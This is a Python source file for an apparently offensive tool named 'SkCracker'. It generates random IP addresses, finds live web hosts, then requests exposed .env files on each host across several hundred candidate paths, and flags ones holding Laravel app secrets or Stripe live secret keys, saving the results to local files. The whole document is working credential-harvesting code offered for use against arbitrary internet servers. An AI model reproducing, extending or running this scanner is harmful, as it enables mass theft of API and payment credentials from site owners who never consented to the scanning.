import time
import requests
import threading
import random
import colorama
from colorama import Fore
import platform
import os
colorama.init()

red = Fore.RED
lightred = Fore.LIGHTRED_EX
black = Fore.BLACK
lightblack = Fore.LIGHTBLACK_EX
white = Fore.WHITE
lightwhite = Fore.LIGHTWHITE_EX
green = Fore.GREEN
lightgreen = Fore.LIGHTGREEN_EX
cyan = Fore.CYAN
lightcyan = Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightmagenta = Fore.LIGHTMAGENTA_EX
yellow = Fore.YELLOW
lightyellow = Fore.LIGHTYELLOW_EX
blue = Fore.BLUE
lightlblue = Fore.LIGHTBLUE_EX
reset = Fore.RESET

def clear():
    if platform.system()=="Windows":
        os.system("cls")
    else:
        os.system("clear")


def main():
    global iplines, last
    clear()
    print(lightred + """
          ██████  ██ ▄█▀    ▄████▄   ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀▓█████  ██▀███  
        ▒██    ▒  ██▄█▒    ▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
        ░ ▓██▄   ▓███▄░    ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
          ▒   ██▒▓██ █▄    ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
        ▒██████▒▒▒██▒ █▄   ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
        ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒   ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
        ░ ░▒  ░ ░░ ░▒ ▒░     ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
        ░  ░  ░  ░ ░░ ░    ░          ░░   ░   ░   ▒   ░        ░ ░░ ░    ░     ░░   ░ 
              ░  ░  ░      ░ ░         ░           ░  ░░ ░      ░  ░      ░  ░   ░     
                           ░                           ░                               
                           

                             ╔══════════════════════════════════╗
                             ║          ► Options               ║
                             ║                                  ║
                             ║    • Generate IP [1]             ║
                             ║    • Generate IP with ENV [2]    ║
                             ║    • Range IP [3]                ║
                             ║    • Check IP [4]                ║
                             ║    • ENV Scanner [5]             ║
                             ║    • Accurate ENV Scanner [6]    ║
                             ║    • SK ENV Extractor [7]        ║
                             ║                                  ║
                             ║             ║
                             ╚══════════════════════════════════╝
                             """)


    selection = input("root@windows:~/SkCracker# » " + white)
    if selection == '1':
        genip()
    elif selection == '2':
        genenv()
    elif selection == '3':
        iprange()
    elif selection == '4':
        clear()
        print(lightred + '\nSkCracker » Input your IP list\n')
        file = input("root@windows:~/SkCracker# » " + white)
        file = open(file, "r")
        iplines = file.readlines()
        last = iplines[len(iplines) - 1]
        print(lightred + '\nSkCracker » Input number of threads\n')
        thrds = int(input("root@windows:~/SkCracker# » " + white))
        clear()
        print(lightred + '\nSkCracker » Checking your Ips...\n')
        threads = []
        for i in range(thrds):
            t = threading.Thread(target=check)
            t.daemon = True
            threads.append(t)
        for i in range(thrds):
            threads[i].start()
        for i in range(thrds):
            threads[i].join()
    elif selection == '5':
        clear()
        print(lightred + '\nSkCracker » Input your LIVE IP list\n')
        file = input("root@windows:~/SkCracker# » " + white)
        file = open(file, "r")
        iplines = file.readlines()
        last = iplines[len(iplines) - 1]
        print(lightred + '\nSkCracker » Input number of threads\n')
        thrds = int(input("root@windows:~/SkCracker# » " + white))
        clear()
        print(lightred + '\nSkCracker » Checking your Ips...\n')
        threads = []
        for i in range(thrds):
            t = threading.Thread(target=envcheck)
            t.daemon = True
            threads.append(t)
        for i in range(thrds):
            threads[i].start()
        for i in range(thrds):
            threads[i].join()
    elif selection == '6':
        clear()
        print(lightred + '\nSkCracker » Input your LIVE IP list\n')
        file = input("root@windows:~/SkCracker# » " + white)
        file = open(file, "r")
        iplines = file.readlines()
        last = iplines[len(iplines) - 1]
        print(lightred + '\nSkCracker » Input number of threads\n')
        thrds = int(input("root@windows:~/SkCracker# » " + white))
        clear()
        print(lightred + '\nSkCracker » Checking your Ips [This will take a LOT of time]...\n')
        threads = []
        for i in range(thrds):
            t = threading.Thread(target=fullenvcheck)
            t.daemon = True
            threads.append(t)
        for i in range(thrds):
            threads[i].start()
        for i in range(thrds):
            threads[i].join()
    elif selection == '7':
        clear()
        print(lightred + '\nSkCracker » Input your LIVE IP ENVS list\n')
        file = input("root@windows:~/SkCracker# » " + white)
        file = open(file, "r")
        iplines = file.readlines()
        last = iplines[len(iplines) - 1]
        print(lightred + '\nSkCracker » Input number of threads\n')
        thrds = int(input("root@windows:~/SkCracker# » " + white))
        clear()
        print(lightred + '\nSkCracker » Checking your Ips...\n')
        threads = []
        for i in range(thrds):
            t = threading.Thread(target=SKenvExtractor)
            t.daemon = True
            threads.append(t)
        for i in range(thrds):
            threads[i].start()
        for i in range(thrds):
            threads[i].join()
    else:
        print('No Options!')




def genip():
    clear()
    print(lightred + '\nSkCracker » Input how many IPs to generate\n')
    nips = input("root@windows:~/SkCracker# » " + white)
    print(lightred + '\nSkCracker » Generating IPs...')
    for i in range(0, int(nips)):
        a = random.randrange(0, 255, 1)
        b = random.randrange(0, 255, 1)
        c = random.randrange(0, 255, 1)
        d = random.randrange(0, 255, 1)
        ip = str(a) + '.' + str(b) + '.' + str(c) + '.' + str(d)
        open('ip.txt', 'a').write(ip+'\n')
    clear()
    print(lightred + '\nSkCracker » [+] GENERATED IPS AND SAVED IN ip.txt!')
    print("\n Returning in 3 seconds...")
    time.sleep(3)
    main()

def genenv():
    clear()
    print(lightred + '\nSkCracker » Input how many IPs to generate\n')
    nips = input("root@windows:~/SkCracker# » " + white)
    print(lightred + '\nSkCracker » Generating IPs...')
    for i in range(0, int(nips)):
        a = random.randrange(0, 255, 1)
        b = random.randrange(0, 255, 1)
        c = random.randrange(0, 255, 1)
        d = random.randrange(0, 255, 1)
        ip = str(a) + '.' + str(b) + '.' + str(c) + '.' + str(d) + "/.env"
        open('ip.txt', 'a').write(ip+'\n')
    clear()
    print(lightred + '\nSkCracker » [+] GENERATED IPS AND SAVED IN ip.txt!')
    print("\n Returning in 3 seconds...")
    time.sleep(3)
    main()



def iprange():
    clear()
    print(lightred + '\nSkCracker » Input your IP list\n')
    list = input("root@windows:~/SkCracker# » " + white)
    print(lightred + '\nSkCracker » Generating IPs...')
    try:
        total = open(list, 'r').readlines()
    except:
        clear()
        print(lightred + '\nSkCracker » Wrong selection! try again')
        print("\n Returning in 3 seconds...")
        time.sleep(3)
        main()
    try:
        for ips in total:
            ips = ips.strip()
            part = ips.split('.')
            for j in range(0, 256):
                for k in range(0, 256):
                    ranged = part[0] + "." + part[1] + "." + str(j) + "." + str(k)
                    open('rangeds.txt', 'a').write(ranged + '\n')
            clear()
            print(lightred + '\nSkCracker » [+] GENERATED IPS AND SAVED IN ip.txt!')
            print("\n Returning in 3 seconds...")
            time.sleep(3)
            main()
    except:
        clear()
        print(lightred + '\nSkCracker » [+] GENERATED IPS AND SAVED IN ip.txt!')
        print("\n Returning in 3 seconds...")
        time.sleep(3)
        main()



def check():
    while True:
        try:
            ip = iplines[0].replace("\n", "").replace("\r", "")
            iplines.pop(0)
        except:
            return
        try:
            r = requests.get(f'http://{ip}', timeout=5)
            if r.status_code == 200:
                print(lightred + f'SkCracker » [+] {ip} LIVE IP')
                open('liveip.txt', 'a').write(ip + '\n')
            elif '<title>' in r.text:
                print(lightred + f'SkCracker » [+] {ip} LIVE IP')
                open('liveip.txt', 'a').write(ip + '\n')
            elif '</body' in r.text:
                print(lightred + f'SkCracker » [+] {ip} LIVE IP')
                open('liveip.txt', 'a').write(ip + '\n')
            elif '</html>' in r.text:
                print(lightred + f'SkCracker » [+] {ip} LIVE IP')
                open('liveip.txt', 'a').write(ip + '\n')
            elif "APP_NAME" in r.text or "APP_ENV" in r.text or "APP_KEY" in r.text or "APP_DEBUG" in r.text or "APP_URL" in r.text or "MIX_PUSHER_APP_KEY" in r.text or "REDIS_HOST" in r.text:
                print(lightred + f'SkCracker » [+] {ip} LIVE IP WITH ENV')
            else:
                pass
        except Exception:
            pass
        if ip in last:
            time.sleep(8)
            clear()
            print(lightred + '\nSkCracker » [+] CHECKED IPS AND SAVED IN liveip.txt!')
            print("\n Returning in 3 seconds...")
            time.sleep(3)
            main()

def envcheck():
    while True:
        try:
            pureip = iplines[0]
            ip = iplines[0].replace("\n", "").replace("\r", "")
            iplines.pop(0)
        except:
            return
        try:
            if "http" in ip:
                pass
            else:
                ip = f"http://{ip}"
            if "env" in ip:
                pass
            else:
                ip = f"{ip}/.env"
            r = requests.get(f'{ip}', timeout=5)
            if "APP_NAME" in r.text or "APP_ENV" in r.text or "APP_KEY" in r.text or "APP_DEBUG" in r.text or "APP_URL" in r.text or "MIX_PUSHER_APP_KEY" in r.text or "REDIS_HOST" in r.text:
                print(f'SkCracker » [+] {ip} FOUND ENV')
                open('envs.txt', 'a').write(ip + "/.env" + '\n')
            else:
                pass
        except Exception:
            print(f'SkCracker » [+] {ip} DEAD IP')
            pass
        if pureip in last:
            time.sleep(8)
            clear()
            print(lightred + '\nSkCracker » [+] CHECKED IPS AND SAVED IN envs.txt IF FOUND ANY!')
            print("\n Returning in 3 seconds...")
            time.sleep(3)
            main()



def fullenvcheck():
    while True:
        try:
            pureip = iplines[0]
            ip = iplines[0].replace("\n", "").replace("\r", "")
            iplines.pop(0)
        except:
            return
        try:
            if "http" in ip:
                pass
            else:
                ip = f"http://{ip}"

            URLPATH = ['/.env','/local/.env', '/admin/.env', '/dev/.env', '/api/.env', '/stag/.env', '/platform/.env', '/staging/.env', '/development/.env', '/localhost/.env', '/test/.env', '/production/.env', '/developer/.env', '/public/.env', '/app/.env', '/core/.env', '/data/.env', '/api1/.env', '/api2/.env', '/api3/.env', '/API/.env', '/apiv1/.env', '/apiv2/.env', '/apiv3/.env', '/apps/.env', '/git/.env', '/laravel/.env', '/sites/.env', '/web/.env', '/v1/api/.env', '/v2/api/.env', '/v3/api/.env', '/site/.env', '/admin/.env', '/administrator/.env', '/backend/.env', '/portal/.env', '/office/.env', '/application/.env', '/laravel2/.env', '/laravel1/.env', '/default/.env', '/public/laravel/.env', '/laravel/public/.env', '/st/.env', '/blog/.env', '/blogs/.env', '/admins/.env', '/Admin/.env', '/ADMIN/.env', '/ADMINISTRATOR/.env', '/Administrator/.env', '/Site/.env', '/Public/.env', '/Staging/.env', '/Stag/.env', '/Production/.env', '/prod/.env', '/Prod/.env', '/Local/.env', '/Development/.env', '/Backend/.env', '/Api/.env' ,'/Api1/.env' ,'/APIV1/.env', '/Platform/.env', '/Laravel/.env', '/Web/.env', '/Core/.env', '/App/.env','/__tests__/test-become/.env', '/_static/.env', '/.c9/metadata/environment/.env', '/.docker/.env', '/.docker/laravel/app/.env', '/.env.backup', '/.env.dev', '/.env.development.local', '/.env.docker.dev', '/.env.example', '/.env.local', '/.env.php', '/.env.prod', '/.env.production.local', '/.env.sample.php', '/.env.save', '/.env.stage', '/.env.test', '/.env.test.local', '/.env~', '/.gitlab-ci/.env', '/.vscode/.env', '/3-sequelize/final/.env', '/07-accessing-data/begin/vue-heroes/.env', '/07-accessing-data/end/vue-heroes/.env', '/08-routing/begin/vue-heroes/.env', '/08-routing/end/vue-heroes/.env', '/09-managing-state/begin/vue-heroes/.env', '/09-managing-state/end/vue-heroes/.env', '/31_structure_tests/.env', '/acme_challenges/.env', '/acme-challenge/.env', '/acme/.env', '/actions-server/.env', '/admin-app/.env', '/admin/.env', '/adminer/.env', '/administrator/.env', '/agora/.env', '/alpha/.env', '/anaconda/.env', '/api/.env', '/api/src/.env', '/app_dir/.env', '/app_nginx_static_path/.env', '/app-order-client/.env', '/app/.env', '/app/client/.env', '/app/code/community/Nosto/Tagging/.env', '/app/config/.env', '/app/config/dev/.env', '/app/frontend/.env', '/app1-static/.env', '/app2-static/.env', '/apps/.env', '/apps/client/.env', '/Archipel/.env', '/asset_img/.env', '/assets/.env', '/Assignment3/.env', '/Assignment4/.env', '/audio/.env', '/awstats/.env', '/babel-plugin-dotenv/test/fixtures/as-alias/.env', '/babel-plugin-dotenv/test/fixtures/default/.env', '/babel-plugin-dotenv/test/fixtures/dev-env/.env', '/babel-plugin-dotenv/test/fixtures/empty-values/.env', '/babel-plugin-dotenv/test/fixtures/filename/.env', '/babel-plugin-dotenv/test/fixtures/override-value/.env', '/babel-plugin-dotenv/test/fixtures/prod-env/.env', '/back-end/app/.env', '/back/.env', '/backend/.env', '/backend/src/.env', '/backendfinaltest/.env', '/backup/.env', '/base_dir/.env', '/basic-network/.env', '/bgoldd/.env', '/bitcoind/.env', '/blankon/.env', '/blob/.env', '/blog/.env', '/blue/.env', '/bookchain-client/.env', '/bootstrap/.env', '/boxes/oracle-vagrant-boxes/ContainerRegistry/.env', '/boxes/oracle-vagrant-boxes/Kubernetes/.env', '/boxes/oracle-vagrant-boxes/OLCNE/.env', '/bucoffea/.env', '/build/.env', '/cardea/backend/.env', '/cdw-backend/.env', '/cgi-bin/.env', '/ch2-mytodo/.env', '/ch6-mytodo/.env', '/ch6a-mytodo/.env', '/ch7-mytodo/.env', '/ch7a-mytodo/.env', '/ch8-mytodo/.env', '/ch8a-mytodo/.env', '/ch8b-mytodo/.env', '/Chai/.env', '/challenge/.env', '/challenges/.env', '/charts/liveObjects/.env', '/chat-client/.env', '/chiminey/.env', '/client-app/.env', '/client/.env', '/client/mutual-fund-app/.env', '/client/src/.env', '/ClientApp/.env', '/clld_dir/.env', '/cmd/testdata/expected/dot_env/.env', '/code/api/.env', '/code/web/.env', '/CodeGolf.Web/ClientApp/.env', '/codenames-frontend/.env', '/collab-connect-web-application/server/.env', '/collected_static/.env', '/community/.env', '/conf/.env', '/config/.env', '/ContainerRegistry/.env', '/content/.env', '/core/.env', '/core/app/.env', '/core/Datavase/.env', '/core/persistence/.env', '/core/src/main/resources/org/jobrunr/dashboard/frontend/.env', '/counterblockd/.env', '/counterwallet/.env', '/cp/.env', '/cron/.env', '/cronlab/.env', '/cryo_project/.env', '/css/.env', '/custom/.env', '/d/.env', '/data/.env', '/database/.env', '/dataset1/.env', '/dataset2/.env', '/default/.env', '/delivery/.env', '/demo-app/.env', '/demo/.env', '/deploy/.env', '/developerslv/.env', '/development/.env', '/directories/.env', '/dist/.env', '/django_project_path/.env', '/django-blog/.env', '/django/.env', '/doc/.env', '/docker-compose/platform/.env', '/docker-elk/.env', '/docker-network-healthcheck/.env', '/docker-node-mongo-redis/.env', '/docker/.env', '/docker/app/.env', '/docker/compose/withMongo/.env', '/docker/compose/withPostgres/.env', '/docker/database/.env', '/docker/db/.env', '/docker/examples/compose/.env', '/docker/postgres/.env', '/docker/webdav/.env', '/docs/.env', '/dodoswap-client/.env', '/dotfiles/.env', '/download/.env', '/downloads/.env', '/e2e/.env', '/en/.env', '/engine/.env', '/env/.env', '/env/dockers/mariadb-test/.env', '/env/dockers/php-apache/.env', '/env/example/.env', '/env/template/.env', '/environments/local/.env', '/environments/production/.env', '/error/.env', '/errors/.env', '/example/.env', '/example02-golang-package/import-underscore/.env', '/example27-how-to-load-env/sample01/.env', '/example27-how-to-load-env/sample02/.env', '/examples/.env', '/examples/01-simple-model/.env', '/examples/02-complex-example/.env', '/examples/03-one-to-many-relationship/.env', '/examples/04-many-to-many-relationship/.env', '/examples/05-migrations/.env', '/examples/06-base-service/.env', '/examples/07-feature-flags/.env', '/examples/08-performance/.env', '/examples/09-production/.env', '/examples/10-subscriptions/.env', '/examples/11-transactions/.env', '/examples/drupal-separate-services/.env', '/examples/react-dashboard/backend/.env', '/examples/sdl-first/.env', '/examples/sdl-first/prisma/.env', '/examples/vue-dashboard/backend/.env', '/examples/web/.env', '/examples/with-cookie-auth-fauna/.env', '/examples/with-dotenv/.env', '/examples/with-firebase-authentication-serverless/.env', '/examples/with-react-relay-network-modern/.env', '/examples/with-relay-modern/.env', '/examples/with-universal-configuration-build-time/.env', '/exapi/.env', '/Exercise.Frontend/.env', '/Exercise.Frontend/train/.env', '/export/.env', '/fastlane/.env', '/favicons/.env', '/favs/.env', '/FE/huey/.env', '/fedex/.env', '/fhir-api/.env', '/files/.env', '/fileserver/.env', '/films/.env', '/Final_Project/Airflow_Dag/.env', '/Final_Project/kafka_twitter/.env', '/Final_Project/StartingFile/.env', '/finalVersion/lcomernbootcamp/projbackend/.env', '/FIRST_CONFIG/.env', '/first-network/.env', '/fisdom/fisdom/.env', '/fixtures/blocks/.env', '/fixtures/fiber-debugger/.env', '/fixtures/flight/.env', '/fixtures/kitchensink/.env', '/flask_test_uploads/.env', '/fm/.env', '/font-icons/.env', '/fonts/.env', '/front-app/.env', '/front-empathy/.env', '/front-end/.env', '/front/.env', '/front/src/.env', '/frontend/.env', '/frontend/momentum-fe/.env', '/frontend/react/.env', '/frontend/vue/.env', '/frontendfinaltest/.env', '/ftp/.env', '/ftpmaster/.env', '/gists/cache', '/gists/laravel', '/gists/pusher', '/github-connect/.env', '/grems-api/.env', '/grems-frontend/.env', '/Hash/.env', '/hasura/.env', '/Helmetjs/.env', '/hgs-static/.env', '/higlass-website/.env', '/home/.env', '/horde/.env', '/hotpot-app-frontend/.env', '/htdocs/.env', '/html/.env', '/http/.env', '/httpboot/.env', '/HUNIV_migration/.env', '/icon/.env', '/icons/.env', '/ikiwiki/.env', '/image_data/.env', '/Imagebord/.env', '/images/.env', '/img/.env', '/install/.env', '/InstantCV/server/.env', '/items/.env', '/javascript/.env', '/js-plugin/.env', '/js/.env', '/jsrelay/.env', '/jupyter/.env', '/khanlinks/.env', '/kibana/.env', '/kodenames-server/.env', '/kolab-syncroton/.env', '/Kubernetes/.env', '/lab/.env', '/laravel/.env', '/latest/.env', '/layout/.env', '/lcomernbootcamp/projbackend/.env', '/leafer-app/.env', '/ledger_sync/.env', '/legacy/tests/9.1.1', '/legacy/tests/9.2.0', '/legal/.env', '/lemonldap-ng-doc/.env', '/lemonldap-ng-fr-doc/.env', '/letsencrypt/.env', '/lib/.env', '/Library/.env', '/libs/.env', '/linux/.env', '/local/.env', '/log/.env', '/logging/.env', '/login/.env', '/mail/.env', '/mailinabox/.env', '/mailman/.env', '/main_user/.env', '/main/.env', '/manual/.env', '/master/.env', '/media/.env', '/memcached/.env', '/mentorg-lava-docker/.env', '/micro-app-react-communication/.env', '/micro-app-react/.env', '/mindsweeper/gui/.env', '/minified/.env', '/misc/.env', '/Modix/ClientApp/.env', '/monerod/.env', '/mongodb/config/dev/.env', '/monitoring/compose/.env', '/moodledata/.env', '/msks/.env', '/munki_repo/.env', '/music/.env', '/MyRentals.Web/ClientApp/.env', '/name/.env', '/new-js/.env', '/news-app/.env', '/nginx-server/.env', '/nginx/.env', '/niffler-frontend/.env', '/node_modules/.env', '/Nodejs-Projects/play-ground/login/.env', '/Nodejs-Projects/play-ground/ManageUserRoles/.env', '/noVNC/.env', '/Nuke.App.Ui/.env', '/oldsanta/.env', '/ops/vagrant/.env', '/option/.env', '/orientdb-client/.env', '/outputs/.env', '/owncloud/.env', '/packages/api/.env', '/packages/app/.env', '/packages/client/.env', '/packages/frontend/.env', '/packages/plugin-analytics/src/fixtures/analytics-ga-key/.env', '/packages/plugin-qiankun/examples/app1/.env', '/packages/plugin-qiankun/examples/app2/.env', '/packages/plugin-qiankun/examples/app3/.env', '/packages/plugin-qiankun/examples/master/.env', '/packages/react-scripts/fixtures/kitchensink/template/.env', '/packages/styled-ui-docs/.env', '/packages/web/.env', '/packed/.env', '/page-editor/.env', '/parity/.env', '/Passportjs/.env', '/patchwork/.env', '/path/.env', '/pfbe/.env', '/pictures/.env', '/playground/.env', '/plugin_static/.env', '/post-deployment/.vscode/.env', '/postfixadmin/.env', '/price_hawk_client/.env', '/prisma/.env', '/private/.env', '/processor/.env', '/prod/.env', '/projbackend/.env', '/project_root/.env', '/psnlink/.env', '/pt2/countries/src/.env', '/pt8/library-backend-gql/.env', '/pub/.env', '/public_html/.env', '/public_root/.env', '/public/.env', '/question2/.env', '/qv-frontend/.env', '/rabbitmq-cluster/.env', '/rails-api/react-app/.env', '/rasax/.env', '/react_todo/.env', '/redmine/.env', '/repo/.env', '/repos/.env', '/repository/.env', '/resources/.env', '/resources/docker/.env', '/resources/docker/mysql/.env', '/resources/docker/phpmyadmin/.env', '/resources/docker/rabbitmq/.env', '/resources/docker/rediscommander/.env', '/resourcesync/.env', '/rest/.env', '/restapi/.env', '/results/.env', '/robots/.env', '/root/.env', '/rosterBack/.env', '/roundcube/.env', '/roundcubemail/.env', '/routes/.env', '/run/.env', '/rust-backend/.env', '/rust-backend/dao/.env', '/s-with-me-front/.env', '/saas/.env', '/samples/chatroom/chatroom-spa/.env', '/samples/docker/deploymentscripts/.env', '/script/.env', '/scripts/.env', '/scripts/fvt/.env', '/selfish-darling-backend/.env', '/Serve_time_server/.env', '/serve-browserbench/.env', '/Server_with_db/.env', '/server/.env', '/server/config/.env', '/server/laravel/.env', '/server/src/persistence/.env', '/services/adminer/.env', '/services/deployment-agent/.env', '/services/documents/.env', '/services/graylog/.env', '/services/jaeger/.env', '/services/minio/.env', '/services/monitoring/.env', '/services/portainer/.env', '/services/redis-commander/.env', '/services/registry/.env', '/services/simcore/.env', '/services/traefik/.env', '/sessions/.env', '/shared/.env', '/shibboleth/.env', '/shop/.env', '/Simple_server/.env', '/site-library/.env', '/site/.env', '/sitemaps/.env', '/sites/.env', '/sitestatic/.env', '/Socketio/.env', '/sources/.env', '/Sources/API/.env', '/spearmint/.env', '/spikes/config-material-app/.env', '/SpotiApps/.env', '/src/__tests__/__fixtures__/instanceWithDependentSteps/.env', '/src/__tests__/__fixtures__/typeScriptIntegrationProject/.env', '/src/__tests__/__fixtures__/typeScriptProject/.env', '/src/__tests__/__fixtures__/typeScriptVisualizeProject/.env', '/src/.env', '/src/add-auth/express/.env', '/src/assembly/.env', '/src/character-service/.env', '/src/client/mobile/.env', '/src/core/tests/dotenv-files/.env', '/src/gameprovider-service/.env', '/src/main/front-end/.env', '/src/main/resources/archetype-resources/__rootArtifactId__-acceptance-test/src/test/resources/app-launcher-tile/.env', '/src/renderer/.env', '/srv6_controller/controller/.env', '/srv6_controller/examples/.env', '/srv6_controller/node-manager/.env', '/st-js-be-2020-movies-two/.env', '/stackato-pkg/.env', '/static_prod/.env', '/static_root/.env', '/static_user/.env', '/static-collected/.env', '/static-html/.env', '/static-root/.env', '/static/.env', '/staticfiles/.env', '/stats/.env', '/storage/.env', '/style/.env', '/styles/.env', '/stylesheets/.env', '/symfony/.env', '/system-config/.env', '/system/.env', '/target/.env', '/temanr9/.env', '/temanr10/.env', '/temp/.env', '/template/.env', '/templates/.env', '/test-network/.env', '/test-network/addOrg3/.env', '/test/.env', '/test/aries-js-worker/fixtures/.env', '/test/bdd/fixtures/adapter-rest/.env', '/test/bdd/fixtures/agent-rest/.env', '/test/bdd/fixtures/couchdb/.env', '/test/bdd/fixtures/demo/.env', '/test/bdd/fixtures/demo/openapi/.env', '/test/bdd/fixtures/did-method-rest/.env', '/test/bdd/fixtures/did-rest/.env', '/test/bdd/fixtures/edv-rest/.env', '/test/bdd/fixtures/openapi-demo/.env', '/test/bdd/fixtures/sidetree-mock/.env', '/test/bdd/fixtures/universalresolver/.env', '/test/bdd/fixtures/vc-rest/.env', '/test/fixtures/.env', '/test/fixtures/app_types/node/.env', '/test/fixtures/app_types/rails/.env', '/test/fixtures/node_path/.env', '/test/integration/env-config/app/.env', '/testfiles/.env', '/testing/docker/.env', '/tests/.env', '/Tests/Application/.env', '/tests/default_settings/v7.0/.env', '/tests/default_settings/v8.0/.env', '/tests/default_settings/v9.0/.env', '/tests/default_settings/v10.0/.env', '/tests/default_settings/v11.0/.env', '/tests/default_settings/v12.0/.env', '/tests/default_settings/v13.0/.env', '/tests/drupal-test/.env', '/tests/Integration/Environment/.env', '/tests/todo-react/.env', '/testwork_json/.env', '/theme_static/.env', '/theme/.env', '/thumb/.env', '/thumbs/.env', '/tiedostot/.env', '/tmp/.env', '/tools/.env', '/Travel_form/.env', '/ts/prime/.env', '/ubuntu/.env', '/ui/.env', '/unixtime/.env', '/unsplash-downloader/.env', '/upfiles/.env', '/upload/.env', '/uploads/.env', '/urlmem-app/.env', '/User_info/.env', '/v1/.env', '/v2/.env', '/var/backup/.env', '/vendor/.env', '/vendor/github.com/gobuffalo/envy/.env', '/vendor/github.com/subosito/gotenv/.env', '/videos/.env', '/vm-docker-compose/.env', '/vod_installer/.env', '/vue_CRM/.env', '/vue-end/vue-til/.env', '/vue/vuecli/.env', '/web-dist/.env', '/web/.env', '/Web/siteMariage/.env', '/webroot_path/.env', '/websocket/.env', '/webstatic/.env', '/webui/.env', '/well-known/.env', '/whturk/.env', '/windows/tests/9.2.x/.env', '/windows/tests/9.3.x/.env', '/wp-content/.env', '/www-data/.env', '/www/.env', '/xx-final/vue-heroes/.env', '/zmusic-frontend/.env']
            for PATHS in URLPATH:
                r = requests.get(f'{ip}{PATHS}', timeout=5)
                if "APP_NAME" in r.text or "APP_ENV" in r.text or "APP_KEY" in r.text or "APP_DEBUG" in r.text or "APP_URL" in r.text or "MIX_PUSHER_APP_KEY" in r.text or "REDIS_HOST" in r.text:
                    print(f'SkCracker » [+] {ip} FOUND ENV')
                    open('accurateENVS.txt', 'a').write(ip + PATHS + '\n')
                else:
                    pass
        except Exception:
            print(ip, '-> DEAD')
            pass
        if pureip in last:
            time.sleep(10)
            clear()
            print(lightred + '\nSkCracker » [+] CHECKED IPS AND SAVED IN accurateENVS.txt IF FOUND ANY!')
            print("\n Returning in 3 seconds...")
            time.sleep(3)
            main()

def SKenvExtractor():
    while True:
        try:
            ip = iplines[0].replace("\n", "").replace("\r", "")
            iplines.pop(0)
        except:
            return
        try:
            if "http" in ip:
                pass
            else:
                ip = f"http://{ip}"

            if "env" in ip:
                pass
            else:
                ip = f"{ip}/.env"

            r = requests.get(f'{ip}', timeout=5)
            if "sk_live" in r.text or "stripe" in r.text or "STRIPE_KEY" in r.text or "STRIPE_SECRET" in r.text:
                print(f'SkCracker » [+] {ip} FOUND SK KEY!')
                open('SKS_ENVS.txt', 'a').write(ip + '\n')
            else:
                pass
        except Exception:
            print(ip, '-> DEAD')
            pass
        if ip in last:
            time.sleep(8)
            clear()
            print(lightred + '\nSkCracker » [+] CHECKED IPS AND SAVED IN SKS_ENVS.txt IF FOUND ANY!')
            print("\n Returning in 3 seconds...")
            time.sleep(3)
            main()

if __name__ == '__main__':
    main()
